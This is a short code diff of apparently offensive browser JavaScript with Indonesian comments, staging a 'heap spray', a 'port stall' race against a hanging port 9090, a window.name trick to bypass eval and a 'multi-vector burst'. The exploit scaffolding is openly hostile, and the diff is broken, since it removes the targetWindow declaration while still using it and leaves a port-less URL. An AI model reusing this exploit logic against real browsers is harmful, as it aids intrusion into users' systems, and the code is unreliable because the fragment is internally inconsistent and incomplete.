@@ -52,12 +52,11 @@
         log("INITIATING HEAP_SPRAY...");
         
         // window.name digunakan untuk bypass 'eval' (sinkronisasi payload)
-    let targetWindow = window.open("https://www.google.com", blobURL);
-
+window.open("https://www.google.com", "_blank");
         // STAGE 1: PORT STALLING (Menciptakan kondisi 'Race')
         // Kita navigasi ke port yang akan hang (9090)
         log("TRIGGERING PORT_STALL...");
-        targetWindow.location.href = "https://www.google.com:9090";
+        targetWindow.location.href = "https://www.google.com:";
 
         setTimeout(() => {
             log("EXECUTING MULTI-VECTOR BURST...");
